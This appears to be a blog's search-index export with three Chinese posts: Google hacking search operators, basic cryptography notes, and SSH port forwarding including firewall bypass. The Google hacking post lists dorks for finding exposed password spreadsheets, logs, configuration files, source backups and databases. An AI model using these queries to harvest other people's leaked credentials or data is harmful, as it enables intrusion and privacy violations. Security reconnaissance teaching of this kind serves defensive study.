<span class="line">        <span class="string">"https://raw.githubusercontent.com/knight-TBO/channel_v3/master/channel_v3.json"</span></span>
<span class="line">    ],</span>
</pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>编程</tag>
        <tag>计算机</tag>
      </tags>
  </entry>
  <entry>
    <title>googlehack</title>
    <url>/2018/07/10/googlehack/</url>
    <content><![CDATA[<p>Google是一个伟大的信息收集工具，在如今的互联网时代，想想看一个人可以轻易的从搜索引擎中获取你详细的个人信息是件多么叫人激动又害怕的事情。Google也可以当作我们的第二个“社工库”。<a id="more"></a><br>More info:<a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">Google Hacking</a></p>
<h2 id="Google基本关键词"><a href="#Google基本关键词" class="headerlink" title="Google基本关键词"></a><a href="#Google基本关键词" title="Google基本关键词"></a>Google基本关键词</h2><p>Intext： 搜索出现的关键词<br>Inurl： 搜索包含关键词的url<br>Intitle： 搜索包含关键词的标题<br>Site： 搜索包含关键词的站点<br>filetype： 搜索包含关键词的文件类型<br>Link： 对于页面包含的外部链接搜索<br>Daterange： 搜索特定的日期范围</p>
<h2 id="Google基本规则"><a href="#Google基本规则" class="headerlink" title="Google基本规则"></a><a href="#Google基本规则" title="Google基本规则"></a>Google基本规则</h2><p>Google 不分大小写<br>Google 可以使用通配符：*表示一个词/字<br>Google 会智能地保留一些内容，比如一些过时的词，一些不适合呈现的内容（比如违法信息）<br>最常用的：”关键字” ，双引号会使Google强制搜索包含关键字的内容布尔操作符：AND(+) NOT(-) OR(|)，AND 现在已不需要，多个关键字google会都匹配到</p>
<h2 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a><a href="#常用示例" title="常用示例"></a>常用示例</h2><h3 id="1、目录列表查找"><a href="#1、目录列表查找" class="headerlink" title="1、目录列表查找"></a><a href="#1、目录列表查找" title="1、目录列表查找"></a>1、目录列表查找</h3><p>目录列表能列出存在于一个web服务器上的文件和目录<br>查找目录列表<br>实例：<br>intitle:index.of 这里的休止符代表的是单个字母的通配符<br>更优化的查找<br>实例：<br>intitle:index.of “parent directory”<br>intitle:index.of name size</p>
<h3 id="2、特定版本的）服务器"><a href="#2、特定版本的）服务器" class="headerlink" title="2、特定版本的）服务器"></a><a href="#2、特定版本的）服务器" title="2、特定版本的）服务器"></a>2、特定版本的）服务器</h3><p>能被攻击者用来决定攻击web服务器最佳方法的一小段信息，就是确切的服务器版本<br>实例：<br>intitle:index.of “server at”<br>intitle:index.of “Apache/1.3.27 Server at”</p>
<h3 id="3、扩展遍历技术"><a href="#3、扩展遍历技术" class="headerlink" title="3、扩展遍历技术"></a><a href="#3、扩展遍历技术" title="3、扩展遍历技术"></a>3、扩展遍历技术</h3><p>经常会出现web页面的备份文件，他们有泄露源码的倾向。常常在配置错误的时候出现这种问题，把php代码备份到不是以php结尾的文件中，比如bak<br>实例：<br>intitle:index.of index.php.bak<br>inurl:index.php.bak</p>
<h3 id="4、配置文件的查找"><a href="#4、配置文件的查找" class="headerlink" title="4、配置文件的查找"></a><a href="#4、配置文件的查找" title="4、配置文件的查找"></a>4、配置文件的查找</h3><p>配置文件的存在说明服务就在附近<br>实例：<br>filetype:conf inurl:firewall<br>如果你能知道配置文件的名字也是一个非常好的搜索方式，当然你可以从配置文件中抽取特定的字符串来查询，如果能再配上软件名字的话就效果更好了</p>
<h3 id="5、日志文件的查找"><a href="#5、日志文件的查找" class="headerlink" title="5、日志文件的查找"></a><a href="#5、日志文件的查找" title="5、日志文件的查找"></a>5、日志文件的查找</h3><p>日志文件中也记录着日志很多的敏感信息<br>日志文件也有一个默认的名字可以被我们用作基础的搜索，最常见的扩展名就是log了<br>实例：<br>filetype:log inurl:log<br>ext log log<br>filetype:log username putty</p>
<h3 id="6、office文档"><a href="#6、office文档" class="headerlink" title="6、office文档"></a><a href="#6、office文档" title="6、office文档"></a>6、office文档</h3><p>实例：<br>filetype:xls inurl:password.xls<br>filetype:xls username password email</p>
<h3 id="6、登录入口"><a href="#6、登录入口" class="headerlink" title="6、登录入口"></a><a href="#6、登录入口" title="6、登录入口"></a>6、登录入口</h3><p>登录入口是第一道防线，很容易泄露软硬件的信息<br>查找入口一般使用关键字login<br>大的厂商一般会把版权的注意事项放在页面的底部<br>实例：<br>intitle:login intext:版权信息</p>
<h3 id="7、错误消息"><a href="#7、错误消息" class="headerlink" title="7、错误消息"></a><a href="#7、错误消息" title="7、错误消息"></a>7、错误消息</h3><p>数据库的错误消息能够用来分析操作系统和web服务器的版本，还可能更多<br>SQL command not properly ended<br>这个表示没有在sql语句的最后找到正确的终止符，所以可能会被用于注入攻击</p>
<h3 id="8、真实的数据库文件"><a href="#8、真实的数据库文件" class="headerlink" title="8、真实的数据库文件"></a><a href="#8、真实的数据库文件" title="8、真实的数据库文件"></a>8、真实的数据库文件</h3><p>攻击者还能直接搜索到数据库本身，并不适合所有的数据库系统，只适合哪些有着特定名字或者扩展名的数据库,因为是二进制文件，所以没法在里面搜索字符<br>实例：<br>filetype:mdb inurl:com</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学笔记</title>
    <url>/2018/06/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>1.<br>加密方法可以分为两大类。一类是单钥加密（private key cryptography），还有一类叫做双钥加密（public key cryptography）。前者的加密和解密过程都用同一套密码，后者的加密和解密过程用的是两套密码。历史上，人类传统的加密方法都是前一种，比如二战期间德军用的Enigma电报密码。<a id="more"></a>莫尔斯电码也可以看作是一种私钥加密方法。</p>
<p>2.<br>在单钥加密的情况下，密钥只有一把，所以密钥的保存变得很重要。一旦密钥泄漏，密码也就被破解。</p>
<p>3.<br>在双钥加密的情况下，密钥有两把，一把是公开的公钥，还有一把是不公开的私钥。</p>
<p>双钥加密的原理如下：<br>a) 公钥和私钥是一一对应的关系，有一把公钥就必然有一把与之对应的、独一无二的私钥，反之亦成立。</p>
<p>b) 所有的（公钥, 私钥）对都是不同的。</p>
<p>c) 用公钥可以解开私钥加密的信息，反之亦成立。</p>
<p>d) 同时生成公钥和私钥应该相对比较容易，但是从公钥推算出私钥，应该是很困难或者是不可能的。</p>
<p>4.<br>目前，通用的单钥加密算法为DES（Data Encryption Standard），通用的双钥加密算法为RSA（ Rivest-Shamir-Adleman），都产生于上个世纪70年代。<br>5.<br>在双钥体系中，公钥用来加密信息，私钥用来数字签名。<br>6.<br>因为任何人都可以生成自己的（公钥，私钥）对，所以为了防止有人散布伪造的公钥骗取信任，就需要一个可靠的第三方机构来生成经过认证的（公钥，私钥）对。目前，世界上最主要的数字服务认证商是位于美国加州的Verisign公司，它的主要业务就是分发RSA数字证书。</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH端口转发</title>
    <url>/2018/05/20/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h2 id="一、-简述"><a href="#一、-简述" class="headerlink" title="一、 简述"></a><a href="#一、-简述" title="一、 简述"></a>一、 简述</h2><p>SSH在维基百科的定义：Secure hell（安全外壳协议，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。<a id="more"></a><br>More info: <a href="https://zh.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener">SSH</a></p>
<h3 id="端口转发简述："><a href="#端口转发简述：" class="headerlink" title="端口转发简述："></a><a href="#端口转发简述：" title="端口转发简述："></a>端口转发简述：</h3><p>但大多数人不知道的是SSH还能提供端口转发，并提供相应的加密及解密服务这也被称为“隧道”(tunneling)，而该功能在可以在有防火墙限制时，转发其它TCP流量来通过SSH端口传输，也就实现了“翻墙”。<br>1.加密 SSH Client 端至 SSH Server 端之间的通讯数据。<br>2.突破防火墙的限制完成一些之前无法建立的 TCP 连接。<br><img src="/images/upload/2018-08-251.jpg" alt=""><br>如上图所示，TCP端口A和B并不直接通信，而是转发到SSH client及SSH server来进行通信，从而实现了数据加密<br>同时可以绕过防火墙的限制。</p>
<hr>
<h2 id="二、-本地转发与远程转发"><a href="#二、-本地转发与远程转发" class="headerlink" title="二、 本地转发与远程转发"></a><a href="#二、-本地转发与远程转发" title="二、 本地转发与远程转发"></a>二、 本地转发与远程转发</h2><h3 id="本地转发示例："><a href="#本地转发示例：" class="headerlink" title="本地转发示例："></a><a href="#本地转发示例：" title="本地转发示例："></a>本地转发示例：</h3><p>现在假设Server上某个端口的服务不能被远程连接，但它的SSH端口却可以连接，那此时我们就可以通过SSH隧道建立本地转发来连接Server上的端口。<br>本地转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">ssh -L &lt;<span class="built_in">local</span> port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;ssh  hostname&gt;</span>
</pre></td></tr></table></figure>

<p>所以我们需要在Client上执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -L 1234:localhost:389 Server</span>
</pre></td></tr></table></figure>

<p>这里的localhost指的是Server。在选择本地监听端口时通常为10334-65535之间且未使用的端口号，因为低于1024的端口号需要管理员权限。<br>然后我们的数据流将会是这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">Client-&gt;Client:1234-&gt;Client ssh-&gt;Server:22-&gt;Server:389</span>
</pre></td></tr></table></figure>

<p>最后Serve上的3389端口应用返回的数据逆向的传输回去完成整个通信。</p>
<h3 id="远程转发示例："><a href="#远程转发示例：" class="headerlink" title="远程转发示例："></a><a href="#远程转发示例：" title="远程转发示例："></a>远程转发示例：</h3><p>现在由于网络或防火墙的原因我们不能用SSH直接从Client连接到Server，但是反向连接却是被允许的，那我们就可以使用远程转发了。<br>远程转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">ssh -R &lt;<span class="built_in">local</span> port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;ssh hostname&gt;</span>
</pre></td></tr></table></figure>

<p>所以我们需要在Server上执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -R 1234:localhost:389 Client</span>
</pre></td></tr></table></figure>

<p>而此次的应用数据流和上面的本地转发依然是一样的，那为什么又要叫远程转发呢？往下看…</p>
<h3 id="本地转发与远程转发的区别与分析："><a href="#本地转发与远程转发的区别与分析：" class="headerlink" title="本地转发与远程转发的区别与分析："></a><a href="#本地转发与远程转发的区别与分析：" title="本地转发与远程转发的区别与分析："></a>本地转发与远程转发的区别与分析：</h3><p>本地转发时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">ssh：Client ssh ————&gt; Server ssh</span>
<span class="line">应用：Client ————&gt; Server</span>
</pre></td></tr></table></figure>

<p>远程转发时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">ssh：Server ssh ————&gt; Client ssh</span>
<span class="line">应用：Client ————&gt; Server</span>
</pre></td></tr></table></figure>

<p>从上面就可以看出区分本地转发还是远程转发就是看ssh的连接反向是否和应用的连接方向一致。</p>
<h4 id="如果别的主机想使用我们的本地转发应该怎么办呢？"><a href="#如果别的主机想使用我们的本地转发应该怎么办呢？" class="headerlink" title="如果别的主机想使用我们的本地转发应该怎么办呢？"></a><a href="#如果别的主机想使用我们的本地转发应该怎么办呢？" title="如果别的主机想使用我们的本地转发应该怎么办呢？"></a>如果别的主机想使用我们的本地转发应该怎么办呢？</h4><p>现在我们假设有A、B、C、D四台主机，A上面的应用想通过B建立的本地转发连接D的服务。<br>只需在B上面执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -g -L 1234:&lt;D&gt;:389 &lt;C&gt;</span>
</pre></td></tr></table></figure>

<p>然后在A上配置连接B的1234端口即可，这里的-g就是为了A能够使用B的本地端口转发。在上面的额连接中A&lt;——&gt;B和C&lt;——&gt;D之间的连接并不是安全的，它们之间并没有经过SSH加解密。</p>
<h2 id="其它类型的转发："><a href="#其它类型的转发：" class="headerlink" title="其它类型的转发："></a><a href="#其它类型的转发：" title="其它类型的转发："></a>其它类型的转发：</h2><h3 id="动态转发："><a href="#动态转发：" class="headerlink" title="动态转发："></a><a href="#动态转发：" title="动态转发："></a>动态转发：</h3><p>上面所讲到的动态转发，远程转发在应用的服务端都有固定端口号，那如果我们不知道这个端口号怎么办？比如Web浏览…<br>动态转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -D &lt;<span class="built_in">local</span> port&gt; &lt;ssh Server&gt;</span>
</pre></td></tr></table></figure>

<p>例如在你本地执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ssh -D 1080 root@ip</span>
</pre></td></tr></table></figure>

<p>这样就创建了一个socks代理服务，如果你有一台国外的vps，这就可以实现翻墙了而且不用担心GFW检测而封了ip。</p>
<h3 id="X协议转发："><a href="#X协议转发：" class="headerlink" title="X协议转发："></a><a href="#X协议转发：" title="X协议转发："></a>X协议转发：</h3><p>X窗口和VNC相似都可以给linux提供桌面窗口服务，现在我们要把Xclient端的X窗口显示在Xserver端。<br>先需要Xclient(也就是远程linux主机)上指定Xserver的位置，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> DISPLAY=&lt;X Server IP&gt;:&lt;display <span class="comment">#&gt;.&lt;virtual #&gt;</span></span>
</pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">export DISPLAY=youDesktop:1.0</span>
</pre></td></tr></table></figure>

<p>建立连接，则从本地主机(Xserver端)发起一个ssh连接即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -X &lt;ssh server&gt;</span>
</pre></td></tr></table></figure>

<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><a href="#Summary" title="Summary"></a>Summary</h2><p>总的来说，对于一些已知端口的应用如Telnet/Smtp等，我们可以使用本地转发或远程转发。而动态转发则实现了socks代理从而起到加密数据传输和突破防火墙的功能。</p>
]]></content>
      <categories>
        <category>网络代理</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
      </tags>
  </entry>
</search>
